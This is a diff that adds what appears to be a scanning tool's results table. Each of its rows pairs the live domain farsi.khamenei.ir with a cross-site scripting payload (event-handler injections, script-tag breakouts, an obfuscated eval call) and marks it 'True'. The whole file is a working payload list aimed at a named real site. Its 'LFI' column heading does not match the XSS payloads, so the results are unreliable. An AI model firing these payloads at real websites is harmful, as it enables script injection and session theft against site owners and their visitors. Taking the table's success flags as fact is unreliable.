@@ -1,0 +1,35 @@
+Domain          Payload                                       LFI             
+==================================================================
+farsi.khamenei.ir "-prompt(8)-"                                 True            
+farsi.khamenei.ir '-prompt(8)-'                                 True            
+farsi.khamenei.ir ";a=prompt,a()//                              True            
+farsi.khamenei.ir ';a=prompt,a()//                              True            
+farsi.khamenei.ir '-eval("window['pro'%2B'mpt'](8)")-'          True            
+farsi.khamenei.ir "-eval("window['pro'%2B'mpt'](8)")-"          True            
+farsi.khamenei.ir "onclick=prompt(8)>"@x.y                      True            
+farsi.khamenei.ir "onclick=prompt(8)><svg/onload=prompt(8)>"@x.y True            
+farsi.khamenei.ir <image/src/onerror=prompt(8)>                 True            
+farsi.khamenei.ir <img/src/onerror=prompt(8)>                   True            
+farsi.khamenei.ir <image src/onerror=prompt(8)>                 True            
+farsi.khamenei.ir <img src/onerror=prompt(8)>                   True            
+farsi.khamenei.ir <image src =q onerror=prompt(8)>              True            
+farsi.khamenei.ir <img src =q onerror=prompt(8)>                True            
+farsi.khamenei.ir </scrip</script>t><img src =q onerror=prompt(8)> True            
+farsi.khamenei.ir <svg onload=alert(1)>                         True            
+farsi.khamenei.ir "><svg onload=alert(1)//                      True            
+farsi.khamenei.ir "onmouseover=alert(1)//                       True            
+farsi.khamenei.ir "autofocus/onfocus=alert(1)//                 True            
+farsi.khamenei.ir '-alert(1)-'                                  True            
+farsi.khamenei.ir '-alert(1)//                                  True            
+farsi.khamenei.ir \'-alert(1)//                                 True            
+farsi.khamenei.ir </script><svg onload=alert(1)>                True            
+farsi.khamenei.ir <x contenteditable onblur=alert(1)>lose focus! True            
+farsi.khamenei.ir <x onclick=alert(1)>click this!               True            
+farsi.khamenei.ir <x oncopy=alert(1)>copy this!                 True            
+farsi.khamenei.ir <x oncontextmenu=alert(1)>right click this!   True            
+farsi.khamenei.ir <x oncut=alert(1)>copy this!                  True            
+farsi.khamenei.ir <x ondblclick=alert(1)>double click this!     True            
+farsi.khamenei.ir <x ondrag=alert(1)>drag this!                 True            
+farsi.khamenei.ir <x contenteditable onfocus=alert(1)>focus this! True            
+farsi.khamenei.ir <x contenteditable oninput=alert(1)>input here! True            
+farsi.khamenei.ir <x contenteditable onkeydown=alert(1)>press any key! True            
